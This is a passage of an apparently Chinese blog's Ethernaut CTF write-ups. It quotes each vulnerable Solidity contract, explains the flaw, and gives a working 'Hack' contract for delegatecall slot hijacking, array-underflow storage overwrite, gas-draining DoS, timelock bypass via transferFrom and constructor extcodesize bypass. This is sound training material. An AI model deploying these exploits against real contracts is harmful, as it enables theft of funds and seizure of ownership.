正如我提到的，这是一个允许您做很多事情的低级函数。通常，它用于： value通过在选项中指定 wei 的数量将 Ether 发送到 EAO 通过在选项中指定 wei 的数量，将 Ether 发送到已实现receiveor函数的合约fallback``value 通过将哪个函数和哪些参数传递给目标函数来调用合约函数&lt;calldata&gt;。例如，abi.encodeWithSignature(&quot;callMePlease()&quot;) 虽然这两个transfer高级send函数（用于将 ETH 发送到目标地址）都使用2300 gas的硬编码量来执行操作，但该call函数有两个选项： 默认情况下，如果您不指定任何内容，它将转发所有剩余的交易气体 gas否则，您可以指定外部合约可以使用参数的气体量 该call函数将返回两个参数： bool success如果调用成功 bytes memory data返回值 每次你执行一个call你应该总是检查它是否已经成功并恢复（或处理它但是你的场景需要）如果success值为假。有关此方面的更多信息，请参阅SWC-104：未经检查的调用返回值。 无论如何，回到我们的场景。我们需要找到一种方法来在Denial withdraw函数向我们发送partner资金时对其进行 DoS。 因为函数没有检查返回值（一般来说，这是一个巨大的错误，请参阅 SWC-104 问题）即使我们在调用执行中恢复withdraw，函数的流程也会继续。我们如何强制停止执行？ 我们唯一的选择是排出所有转发的气体，并由于“气体不足”异常而使智能合约恢复。 一种简单的方法是使用无限循环对状态变量执行计数器增加 参考视频 写的攻击合约： 1234567891011contract Hack &#123; constructor(Denial target) &#123; target.setWithdrawPartner(address(this)); &#125; fallback() external payable &#123; assembly &#123; invalid() &#125; &#125;&#125; 3. 解题 3.1 获取关卡实例地址：0xa22A605788d9828cb51eAd6AA5d5549cb40Da5F0 3.2 将实力地址作为参数，用以部署攻击合约 3.3 提交案例 3.4 成功！！！！","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Alien Codex","slug":"CTFS/ethernaut/Alien Codex","date":"2023-01-19T04:10:10.000Z","updated":"2023-01-19T04:10:10.000Z","comments":true,"path":"2023/01/19/CTFS/ethernaut/Alien Codex/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/19/CTFS/ethernaut/Alien%20Codex/","excerpt":"","text":"Alien Codex1. 题目要求 1.1 你打开了一个 Alien 合约. 申明所有权来完成这一关. 这可能有帮助 理解Array Storage是怎么回事 理解 ABI specifications 使用一个非常 狗 方法 1.2 题目代码： 12345678910111213141516171819202122232425262728293031// SPDX-License-Identifier: MITpragma solidity ^0.5.0;import &#x27;../helpers/Ownable-05.sol&#x27;;contract AlienCodex is Ownable &#123; bool public contact; bytes32[] public codex; modifier contacted() &#123; assert(contact); _; &#125; function make_contact() public &#123; contact = true; &#125; function record(bytes32 _content) contacted public &#123; codex.push(_content); &#125; function retract() contacted public &#123; codex.length--; &#125; function revise(uint i, bytes32 _content) contacted public &#123; codex[i] = _content; &#125;&#125; 2. 分析tips: 参考博客 2.1 在 AlienCodex 合约中，我们可以利用该retract()函数导致数组长度出现整数下溢codex。这个下溢允许我们通过函数修改合约中的任何状态变量revise()。该漏洞可以按如下方式执行： 调用make_contact()函数通过contacted()修饰符检查，要求contact为真。 调用retract()函数导致数组codex长度整数溢出 通过以下方式找到状态变量的散列，owner就好像它是codex数组的一部分一样： 获取数组中第一项的哈希值codex（因为它在合约存储中被索引），对应于它在合约存储中的槽位。这可以通过计算第一个位置的 Keccak256 哈希值来获得，因此：keccak256(0x0000000000000000000000000000000000000000000000000000000000000001)。 取由此 ( 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6) 产生的哈希值，并从合约中的最大插槽数量中减去其整数值加一 (2个256−1个), 大概是这样的： d.使用这个结果值作为revise()要修改的i数组的（索引)和我们的地址。codex``_content 2.2 参考视频 写的攻击合约 12345678910111213141516171819202122232425interface IAlienCodex &#123; function owner() external view returns (address); function make_contact() external; function revise(uint i, bytes32 _content) external; function retract() external;&#125;contract Hack &#123; constructor(IAlienCodex target) &#123; target.make_contact(); target.retract(); uint256 h = uint256(keccak256(abi.encode(uint256(1)))); uint256 i = uint256(0) - h; // unchecked &#123; // i = i - h; // &#125; target.revise(i, bytes32(uint256(uint160(msg.sender)))); require(target.owner() == msg.sender, &quot;Hack Failed&quot;); &#125;&#125; 3. 解题 3.1 获取关卡实例地址：0x175A96bA1755F20E85ff80089ec9000dD0df463e 3.2 将实例地址作为参数进行对攻击合约的部署 3.3 提交案例 3.4 成功！！！！","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"MagicNumber","slug":"CTFS/ethernaut/MagicNumber","date":"2023-01-19T01:10:10.000Z","updated":"2023-01-19T01:10:10.000Z","comments":true,"path":"2023/01/19/CTFS/ethernaut/MagicNumber/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/19/CTFS/ethernaut/MagicNumber/","excerpt":"","text":"MagicNumber1. 题目要求 1.1 To solve this level, you only need to provide the Ethernaut with a Solver, a contract that responds to whatIsTheMeaningOfLife() with the right number. Easy right? Well… there’s a catch. The solver’s code needs to be really tiny. Really reaaaaaallly tiny. Like freakin’ really really itty-bitty tiny: 10 opcodes at most. Hint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. That’s right: Raw EVM bytecode. Good luck 1.2 译：要解决这个关卡，你只需要向 Ethernaut 提供一个，一个用正确的数字Solver响应的合约。whatIsTheMeaningOfLife() 简单吧？嗯…有一个问题。 求解器的代码需要非常小。真的很小。就像 freakin’ really really itty-bitty tiny：最多 10 个操作码。 提示：也许是时候暂时离开 Solidity 编译器的舒适环境，并手动构建这个 O_o。没错：原始 EVM 字节码。 祝你好运！ 1.3 题目代码： 12345678910111213141516171819202122232425// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract MagicNum &#123; address public solver; constructor() &#123;&#125; function setSolver(address _solver) public &#123; solver = _solver; &#125; /* ____________/\\\\\\_______/\\\\\\\\\\\\\\\\\\_____ __________/\\\\\\\\\\_____/\\\\\\///////\\\\\\___ ________/\\\\\\/\\\\\\____\\///______\\//\\\\\\__ ______/\\\\\\/\\/\\\\\\______________/\\\\\\/___ ____/\\\\\\/__\\/\\\\\\___________/\\\\\\//_____ __/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_____/\\\\\\//________ _\\///////////\\\\\\//____/\\\\\\/___________ ___________\\/\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_ ___________\\///_____\\///////////////__ */&#125; - 2. 分析tips： 参考博客 2.1有一个在调用时whatIsTheMeaningOfLife应答0x000000000000000000000000000000000000000000000000000000000000002a(bytes32) 的函数。这是十进制的 42 的十六进制转换。2）我们的合约代码必须小于10字节 这些要求似乎无法实现，即使使用原始字节码来定义函数、处理函数选择器等，也将远远超过 10 字节的代码。 但是我们真的需要有那个功能吗？最后，我们必须塑造合约代码才能通过挑战。如果我们的合同，无论它如何执行，只返回42怎么办？ 这就是诀窍！如果你认为它就像拥有一个 Solidity 智能合约而不是只有一个fallback函数，那么无论你尝试低级调用哪个函数，它都将始终且只执行该fallback函数。 2.2 现在我们需要部署我们刚刚在上一节中编写的最小合约。当一个智能合约被创建时（via CREATEor CREATE2opcode），EVM 会执行一次构造函数代码，并且部署的智能合约的代码会被 opcode 返回RETURN（这个返回的代码称为运行时代码，它是将要执行的代码当您与智能合约交互时） 参考视频 写的攻击合约： 12345678910111213contract Hack &#123; constructor(MagicNum target) &#123; bytes memory bytecode = hex&quot;69602a60005260206000f3600052600a6016f3&quot;; address addr; assembly &#123; addr := create(0, add(bytecode, 0x20), 0x13) &#125; require(addr != address(0)); target.setSolver(addr); &#125;&#125; 3. 解题 3.1 获取关卡实例地址：0x5072f4af6D9B0907833C43b199000347158f685d 3.2 传入实例地址部署攻击合约 3.3 提交实例 3.4 成功！！！！","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Recovery","slug":"CTFS/ethernaut/Recovery","date":"2023-01-18T11:10:10.000Z","updated":"2023-01-18T11:10:10.000Z","comments":true,"path":"2023/01/18/CTFS/ethernaut/Recovery/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/18/CTFS/ethernaut/Recovery/","excerpt":"","text":"Recovery1. 题目要求 1.1 合约创建者构建了一个非常简单的代币工厂合约。 任何人都可以轻松创建新代币。 在部署了一个代币合约后，创建者发送了 0.001 以太币以获得更多代币。 后边他们丢失了合约地址。 如果您能从丢失的的合约地址中找回(或移除)，则顺利通过此关。 1.2 题目代码 12345678910111213141516171819202122232425262728293031323334353637383940// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Recovery &#123; //generate tokens function generateToken(string memory _name, uint256 _initialSupply) public &#123; new SimpleToken(_name, msg.sender, _initialSupply); &#125;&#125;contract SimpleToken &#123; string public name; mapping (address =&gt; uint) public balances; // constructor constructor(string memory _name, address _creator, uint256 _initialSupply) &#123; name = _name; balances[_creator] = _initialSupply; &#125; // collect ether in return for tokens receive() external payable &#123; balances[msg.sender] = msg.value * 10; &#125; // allow transfers of tokens function transfer(address _to, uint _amount) public &#123; require(balances[msg.sender] &gt;= _amount); balances[msg.sender] = balances[msg.sender] - _amount; balances[_to] = _amount; &#125; // clean up after ourselves function destroy(address payable _to) public &#123; selfdestruct(_to); &#125;&#125; 2. 分析tips： 参考博客 2.1合约地址是确定性的，可以从合约的部署者地址和来自部署者的部署交易的随机数中得出。 在这种情况下，我们从一开始就有这些信息： 合同部署者地址（我们的例子，在我的例子中0xc03f501C5987CAaC9e4470849f13eEA338b76E9f） 部署第一个 SimpleToken 的随机数（1 如练习所述） 因此，我们可以轻松计算出第一个 SimpleToken 部署的合约地址，结果为0xa26D4caf289D657F24f8d2D26f0DFe99a0B312db. 从技术上讲，这里很容易作弊，因为通过检查实例合约的内部交易，很容易在区块浏览器上看到我们要排空的合约的合约地址。然而，练习的目的是我们自己推导出地址。 有了这些信息，我们现在要做的就是调用destroy()SimpleToken 合约中的函数，并将其中的资金定向到任何地址，以便将练习标记为已完成。 2.2 做法： 一旦我们有了这两个细节（部署地址，随机数），就像我在解决方案中描述的那样，我们就可以在 python 中（或直接在 solidity 中）编写一个函数来获取地址。作为一个足智多谋的开发人员，即使我知道如何计算它，我仍然决定去 StackExchange 中找到一个现成的解决方案以跳过这个： # compute address of a given contract to be deployed from # the deployer address + nonce, as stated in the Section 7 # of the Ethereum yellowpaper for contracts created using CREATE def mk_contract_address(sender: str, nonce: int) -&gt; str: &quot;&quot;&quot;Create a contract address using eth-utils. # Modified from Mikko Ohtamaa&#39;s original answer which was later # edited by Utgarda # Obtained from https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed &quot;&quot;&quot; sender_bytes = to_bytes(hexstr=sender) raw = rlp.encode([sender_bytes, nonce]) h = keccak(raw) address_bytes = h[12:] return to_checksum_address(address_bytes) 12345678910111213141516171819202122- 然后，我们可以插入这些值并找到第一个 SimpleToken 部署的地址：- &gt; first_simpletoken_contract_address = mk_contract_address(recovery.address, 1)- 连接到这个合约并调用`destroy()`函数，将资金发送到我的地址。- &gt; simpletoken.destroy(acc.address, _**from**)- 攻击合约来自 [参考视频](https://www.youtube.com/watch?v=K8AFyNiuTXs) ```solidity contract Dev &#123; function recover(address sender) external pure returns (address) &#123; address addr = address(uint160(uint256( keccak256(abi.encodePacked( bytes1(0xd6), bytes1(0x94), sender, bytes1(0x01) )) ))); return addr; &#125; &#125; 3. 解题 3.1 获取实例地址：0x7802095a90641cd76543bc7df683d24D4bdd4436 3.2 部署Dev合约，调用合约中的recover() 函数，传入的形参为关卡实例 3.3 将调用recover() 函数 返回的地址带到区块链浏览器上查看交易 3.3 使用recover() 函数 返回的地址获取部署的SimpleToken合约，并将调用SimpleToken合约中的destroy() 函数，传入的形参为自己 的钱包地址 3.4 执行destroy() 函数之后，到区块链浏览器中再去查看地址的余额为0 3.5 提交案例 3.6 成功！！！！","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Preservation","slug":"CTFS/ethernaut/Preservation","date":"2023-01-18T09:10:10.000Z","updated":"2023-01-18T09:10:10.000Z","comments":true,"path":"2023/01/18/CTFS/ethernaut/Preservation/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/18/CTFS/ethernaut/Preservation/","excerpt":"","text":"Preservation1.题目要求 1.1 该合约利用库合约保存 2 个不同时区的时间戳。合约的构造函数输入两个库合约地址用于保存不同时区的时间戳。 通关条件：尝试取得合约的所有权（owner）。 可能有帮助的注意点： 深入了解 Solidity 官网文档中底层方法 delegatecall 的工作原理，它如何在链上和库合约中的使用该方法，以及执行的上下文范围。 理解 delegatecall 的上下文保留的含义 理解合约中的变量是如何存储和访问的 理解不同类型之间的如何转换 1.2 题目代码： 1234567891011121314151617181920212223242526272829303132333435363738394041// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Preservation &#123; // public library contracts address public timeZone1Library; address public timeZone2Library; address public owner; uint storedTime; // Sets the function signature for delegatecall bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;)); constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) &#123; timeZone1Library = _timeZone1LibraryAddress; timeZone2Library = _timeZone2LibraryAddress; owner = msg.sender; &#125; // set the time for timezone 1 function setFirstTime(uint _timeStamp) public &#123; timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp)); &#125; // set the time for timezone 2 function setSecondTime(uint _timeStamp) public &#123; timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp)); &#125;&#125;// Simple library contract to set the timecontract LibraryContract &#123; // stores a timestamp uint storedTime; function setTime(uint _time) public &#123; storedTime = _time; &#125;&#125; 2. 分析参考文章1 参考文章2第一类分析方法 2.1 目标：声明对给定实例的所有权 2.2 它有一个uint256 storedTime状态变量和一个 setter 函数setTime，可以根据用户的输入更新状态变量。 12345678910// Simple library contract to set the timecontract LibraryContract &#123; // stores a timestamp uint storedTime; function setTime(uint _time) public &#123; storedTime = _time; &#125;&#125; 2.3 分析主函数的代码 它有五个不同的状态变量 address public timeZone1Library第一时区图书馆地址 address public timeZone2Library第二时区图书馆地址 address public owner所有者的地址 uint256 storedTime两个时区库之一存储的时间 bytes4 constant setTimeSignature``setTime时区库中函数的签名。constant由于关键字，这不是真正的状态变量 合约的the constructorof the contract 采用两种address类型的输入来设置两个库地址并将所有者设置为msg.sender. 然后我们有两个不同的功能 function setFirstTime(uint256 _timeStamp) public function setSecondTime(uint256 _timeStamp) public 它们是相同的，它们只是在两个不同的时区库上执行相同的代码 当Preservation合约执行时setFirstTime(100)，它会调用LibraryContract.setTime(100)via delegatecall。 执行的代码来自合约LibraryContract，但使用的上下文是执行操作码的上下文delegatecall。当我们谈论上下文时，我们指的是存储、当前发送者( msg.sender) 和当前值( msg.value)。 如果**LibraryContract**修改状态，它不会修改自己的状态，而是修改调用者（**Preservation**）的状态！这意味着当LibraryContract.setTime更新storedTime状态变量时，不是从它自己的合约更新变量，而是更新调用者合约的slot0中的变量，即timeZone1Library地址。 setSecondTime执行函数时会发生同样的事情，它将更新合约slot0Preservation中的变量。 我们如何利用这个漏洞？有没有办法修改delegatecall存储状态变量信息的第三个存储槽owner？ 好吧，不是直接来自setFirstTime，否则会修改slot0setSecondTime变量的值。但是，如果我们将slot0地址替换为我们已部署的合约的地址，这将模拟相同的布局存储并且确实会更新slot3变量怎么办？ 第二类分析方法 保存合约使用地址中分配的合约timeZone1Library和timeZone2Library库合约。因此，对这些合约的所有调用都是在保存合约中完成的delegatecall，不会触及每个合约的存储LibraryContract，而是触及保存合约的存储。 当我们storedTime通过库合约中的函数修改变量时，我们不是在库或保存合约中修改delegatecall，而是在保存合约中占用相应存储槽的变量。setTime()``storedTimestoredTime 因此，调用setFirstTime()orsetSecondTime()将timeZone1Library使用我们作为 传递的任何值进行修改_timeStamp。因此，为了利用合约并成为owner，我们需要部署一个与Preservation 具有相同存储布局的合约，这意味着我们的攻击者合约应该定义： 123address public timeZone1Library;address public timeZone2Library;address public owner; 与保存的顺序完全相同。 此外，攻击者合约中必须定义两个附加功能： 一个setTime()带有uint256参数的函数，在攻击者合约的情况下，它将修改其第三个内存槽中的变量，因此owner。这个变量的名称无关紧要，因为我们只对修改 Preservation 中的第 3 个内存槽感兴趣，但为了保持一致，我也将其命名为owner。 123function setTime(uint256) public &#123; owner = tx.origin;&#125; 在保护中调用的函数setFirstTime()，以使timeZone1Library攻击者签订合同。如果每个 LibraryContract 都使用与 Preservation 相同的布局进行正确编码，则 Preservation 合约不会以这种方式受到攻击。 123function setFirstTimeExploit() external &#123; preservationContract.setFirstTime(uint256(address(this)));&#125; preservationContract保存合同的接口在哪里。 因此流程如下： 通过从攻击者合约调用来创建攻击者合约timeZone1Library地址setFirstTime()。 使用setFirstTime()任何无符号整数作为参数调用保存合约，该合约setTime()在攻击者合约中执行，生成owner我们的原始地址。 参考视频 写的攻击合约 12345678910111213141516contract Hack &#123; address public timeZone1Library; address public timeZone2Library; address public owner; function attack(Preservation target) external &#123; target.setFirstTime(uint256(uint160(address(this)))); target.setFirstTime(uint256(uint160(msg.sender))); require(target.owner() == msg.sender, &quot;hack failed&quot;); &#125; function setTime(uint _owner) external &#123; owner = address(uint160(_owner)); &#125;&#125; 3. 解题 3.1 获取关卡实例地址：0x5E4d571ae5dAA2A4D530a1a5B89C11d6fEae8440 3.2 部署攻击合约，调用Hack 合约中的attack() 函数，形参是实例地址 3.3 提交案例 3.4 成功！！！！","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Naught Coin","slug":"CTFS/ethernaut/Naught Coin","date":"2023-01-18T07:10:10.000Z","updated":"2023-01-18T07:10:10.000Z","comments":true,"path":"2023/01/18/CTFS/ethernaut/Naught Coin/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/18/CTFS/ethernaut/Naught%20Coin/","excerpt":"","text":"Naught Coin1. 题目要求 1.1 NaughtCoin 是一种 ERC20 代币，而且您已经持有这些代币。问题是您只能在 10 年之后才能转移它们。您能尝试将它们转移到另一个地址，以便您可以自由使用它们吗？通过将您的代币余额变为 0 来完成此关卡。 这可能有用 ERC20标准 OpenZeppelin仓库 1.2 题目代码： 1234567891011121314151617181920212223242526272829303132333435363738// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &#x27;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol&#x27;; contract NaughtCoin is ERC20 &#123; // string public constant name = &#x27;NaughtCoin&#x27;; // string public constant symbol = &#x27;0x0&#x27;; // uint public constant decimals = 18; uint public timeLock = block.timestamp + 10 * 365 days; uint256 public INITIAL_SUPPLY; address public player; constructor(address _player) ERC20(&#x27;NaughtCoin&#x27;, &#x27;0x0&#x27;) &#123; player = _player; INITIAL_SUPPLY = 1000000 * (10**uint256(decimals())); // _totalSupply = INITIAL_SUPPLY; // _balances[player] = INITIAL_SUPPLY; _mint(player, INITIAL_SUPPLY); emit Transfer(address(0), player, INITIAL_SUPPLY); &#125; function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123; super.transfer(_to, _value); &#125; // Prevent the initial owner from transferring tokens until the timelock has passed modifier lockTokens() &#123; if (msg.sender == player) &#123; require(block.timestamp &gt; timeLock); _; &#125; else &#123; _; &#125; &#125; &#125; 2. 分析 2.1 通过让您的代币余额为 0 来完成此级别 2.2 ***tips：**在*constructor**. *_mint*在执行合约*emit*事件**后*Transfer*，不知道 OpenZeppelin*_mint*函数的本机实现已经是*emit*事件*Transfer* 要解决这个合约，我们需要知道 ERC20 代币的 EIP（以太坊改进提案）是如何工作的，以及 OpenZeppelin 是如何实现它的（该合约使用的是 OpenZeppelin 框架库）。 您可以从这些链接中找到所需的所有信息： 以太坊 EIP-20 OpenZeppelin ERC20 文档 OpenZeppelin ERC20 实现 转移代币有两种方式： 通过transfer允许msg.sender直接将代币转移到recipient 通过transferFrom允许外部任意sender（可能是代币本身的所有者）代表所有者将amount代币转移到recipient. 在发送这些代币之前，所有者必须已批准管理sender该数量的代币 因为transfer方法已经overrided约定好了NaughtCoin，我们可以使用函数来规避限制transferFrom。 这是我们需要做的： 创建一个二级账户，将我们所有的代币转移到 2) 在调用之前批准我们自己管理全部代币transferFrom3) 调用transferFrom(player, secondaryAccount, token.balanceOf(player))4) 随心所欲地使用代币！ 1NaughtCoin`合约应该实施什么才能真正锁定我们的代币**10 年**？他们可以实现EIP-20 定义的**一个挂钩**`overriding`，称为.`transfer``_beforeTokenTransfer 当发生任何类型的令牌传输时，将调用此挂钩： mint（从地址转移0x到用户） burn（从用户转移到0x地址） transfer transferFrom 通过这样做，他们可以防止这种利用。 2.3 参考视频 写的攻击合约 interface INaughtCoin &#123; function player() external view returns (address); &#125; contract Hack &#123; function pwn(IERC20 coin) external &#123; address player = INaughtCoin(address(coin)).player(); uint bal = coin.balanceOf(player); coin.transferFrom(player, address(this), bal); &#125; &#125; 1234567- 2.4 解题步骤为：- ``` // 1.Deploy // 2.coin.approve(hack, amount) // 3.pwn() 3. 解题 3.1 获取关卡实例地址：0x34df3070B62B46bCBc4d0a2cbCcd670109041b8a 3.2 部署攻击合约 Hack 3.3 根据关卡实例地址 生成 IECR20 合约 3.4 调用IECR20 合约中的balanceOf() 函数查看当前账户余额 3.5 再调用IECR20 合约的approve() 函数，传入Hack 合约地址和 所查账户余额 3.6 调用Hack 合约中的pwn() 函数 传入关卡实例 3.7 回到IECR20 合约中调用balanceOf() 函数查看当前账户余额 3.8 提交实例 3.9 成功！！！！","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Gatekeeper Two","slug":"CTFS/ethernaut/GatekeeperTwo","date":"2023-01-09T05:02:15.000Z","updated":"2023-01-09T05:02:15.000Z","comments":true,"path":"2023/01/09/CTFS/ethernaut/GatekeeperTwo/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/09/CTFS/ethernaut/GatekeeperTwo/","excerpt":"","text":"Gatekeeper Two1. 题目要求 1.1 题目：这个守门人带来了一些新的挑战, 同样的需要注册为参赛者来完成这一关 这可能有帮助: 想一想你从上一个守门人那学到了什么. 第二个门中的 assembly 关键词可以让一个合约访问非原生的 vanilla solidity 功能. 参见 here . extcodesize 函数可以用来得到给定地址合约的代码长度 - 你可以在这个页面学习到更多 yellow paper. ^ 符号在第三个门里是位操作 (XOR), 在这里是代表另一个常见的位操作 (参见 here). Coin Flip 关卡也是一个很好的参考. 1.2 题目代码： 1234567891011121314151617181920212223242526272829// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract GatekeeperTwo &#123; address public entrant; modifier gateOne() &#123; require(msg.sender != tx.origin); _; &#125; modifier gateTwo() &#123; uint x; assembly &#123; x := extcodesize(caller()) &#125; require(x == 0); _; &#125; modifier gateThree(bytes8 _gateKey) &#123; require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max); _; &#125; function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123; entrant = tx.origin; return true; &#125;&#125; 2. 分析 2.1 与 Gatekeeper One 一样，我们必须成功通过函数的 3 次修饰符检查enter()才能创建entrant我们的地址 2.2 交易必须从合约发送，以便合约地址 ( msg.sender) 与合约调用者 ( tx.origin) 不同。 msg.sender和tx.origin 在函数调用者上运行 solidity 汇编操作码的结果extcodesize()返回调用者合约代码的长度，但是，当我们从合约调用的构造函数执行外部调用时，extcodesize()返回零，因为合约在构造期间没有可用的源代码. Consensys 智能合约最佳实践页面中的此页面详细介绍了它。因此，这extcodesize()不是检查外部调用是由合约还是外部拥有的帐户执行的可靠方法。我们在这里要做的就是运行enter()从调用合约的构造函数调用函数的代码。 按位XOR和通过它操作的每个元素都是它自己的逆，所以如果我们有如果： 1uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1 为真，则： 1uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1 == uint64(_gateKey) 也是如此。因此，*我们不需要_gateKey*，我们可以简单地将结果uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1作为参数传递，enter()但强制转换为bytes8as 这就是所enter()需要的。 参考博客 门 1：msg.sender和tx.origin 要打开这扇门，我们必须了解msg.sender它们tx.origin之间的区别。 让我们看看 Solidity 文档对这些全局变量的看法： msg.sender( address): 消息的发送者（当前通话） tx.origin( address): 交易的发送方（完整的调用链） 当交易由 EOA 进行并直接与智能合约交互时，这些变量将具有相同的值。但是，如果它与中间人合约交互A，然后B通过直接调用（而不是 a delegatecall）与另一个合约交互，那么这些值将不同。 在这种情况下： msg.sender将有 EOA 地址 tx.origin``A将有合同的地址 因为为了gateOne不恢复，我们需要让msg.sender != tx.origin这意味着我们必须enter从智能合约而不是直接从玩家的 EOA 调用。 这不是挑战的一部分，但我建议您阅读我在进一步阅读中列出的关于一些安全问题和最佳实践tx.orgin以及何时不应使用它的内容。 关卡2：背后的玄机extcodesize 第二个门是了解更多关于合约如何部署以及合约在部署过程中的生命周期的绝好机会。 让我们看看函数的代码： 12345678修饰符 gateTwo() &#123; uint256 x; 程序集 &#123; x := extcodesize(caller()) &#125; require(x == 0); _; &#125; 如果这是您第一次看到关键字assembly ，请不要害怕。这就是 Solidity 允许您使用称为Yul. 这里不是讨论这个话题的地方，但如果您想了解更多， Solidity 文档网站上有大量关于 Yul 的内容。 让我们看看这两个操作码在执行时做了什么： CALLER操作码返回调用者帐户的 20 字节地址。这是执行最后一次调用的帐户（委托调用除外）。 EXCODESIZE操作码在执行时返回作为参数传递的地址的代码大小（以字节为单位）。 这个门要求的code大小caller必须是0。 如果caller是一个总是返回零的 EOA（外部拥有账户），但事实并非如此，因为正如我们所说，msg.sender由于第一门要求，调用者 ( ) 必须是智能合约。 智能合约如何实现零代码？好吧，这是真的有一个特例。智能合约在编译时有两种不同的字节码。 创建字节码是以太坊创建合约和只执行一次构造函数所需的字节码 运行时字节码是合约的真实代码，存储在区块链中的代码将用于执行您的智能合约功能 当执行构造函数初始化合约存储时，它返回运行时字节码。直到构造函数的最后，合约本身没有任何运行时字节码，这意味着如果你调用address(contract).code.length它会返回0！ 如果您想在 EVM 级别阅读更多相关信息，可以深入阅读 OpenZeppelin 博客文章解构 Solidity 合约——第二部分：创建与运行时 因此，要通过第二道门，我们只需要从智能合约enter中调用即可！Exploiter``constructor Gate 3：铸造、向下铸造和位运算 最后一扇门是另一扇让你大吃一惊的门。你准备好了吗？ 我们再次讨论类型和位运算之间的转换 来看看需求uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1 合约是用0.8.x之前的Solidity版本编译的，所以在执行数学运算时不会回滚uint64(0) - 1。此操作是表达“给我 auint64可以容纳的最大数量”的“旧方法”。你可以通过做来表达同样的事情type(uint64).max。 该部分从（在这种情况下是合同）中bytes8(keccak256(abi.encodePacked(msg.sender)))获取不太重要的内容并将它们转换为8 bytes``msg.sender``Exploiter``uint64 该指令a ^ b是按位XOR操作。操作XOR是这样的：如果 position 中的位相等，它将导致0otherwise in a 1。使a ^ b = type(uint64).max（所以所有1）b必须是的倒数a。 这意味着我们gateKey必须是bytes8(keccak256(abi.encodePacked(msg.sender))) 在 solidity 中，没有“反向”操作，但我们可以通过XOR在输入和值之间进行操作来重新创建它F，其中只有 s。 这意味着我们可以gateKey通过执行来计算正确的bytes8(keccak256(abi.encodePacked(address(this)))) ^ 0xFFFFFFFFFFFFFFFF 2.3 参考视频 写的攻击合约 contract Hack &#123; constructor(GatekeeperTwo target) &#123; uint64 s = uint64(bytes8(keccak256(abi.encodePacked(address(this))))); uint64 k = s ^ type(uint64).max; bytes8 key = bytes8(k); require(target.enter(key), 